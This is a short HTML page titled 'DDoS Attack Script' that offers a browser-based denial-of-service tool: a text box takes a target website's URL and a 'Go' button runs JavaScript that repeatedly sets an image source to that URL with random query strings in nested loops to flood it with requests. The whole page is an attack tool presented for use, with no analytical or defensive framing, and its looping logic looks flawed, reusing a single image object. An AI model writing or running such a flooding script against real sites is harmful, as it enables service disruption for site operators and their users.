<html>
<head>
    <title>DDoS Attack</title>
    <script>
        function ddos() {
            var url = document.getElementById("url").value;
            var img = new Image();
            img.src = url + "/?" + Math.random();
            var img_arr = [];
            for (var i = 0; i < 100000; i++) {
                img_arr.push(img);
            }
            for (var j = 0; j < 100; j++) {
                for (var k = 0; k < 100000; k++) {
                    img_arr[k].src = url + "/?" + Math.random();
                }
            }
        }
    </script>
</head>
<body>
    <h1>DDoS Attack Script</h1>
    <p>Enter the URL of the target website:</p>
    <input type="text" id="url" placeholder="https://example.com">
    <button onclick="ddos()">Go</button>
</body>
</html>
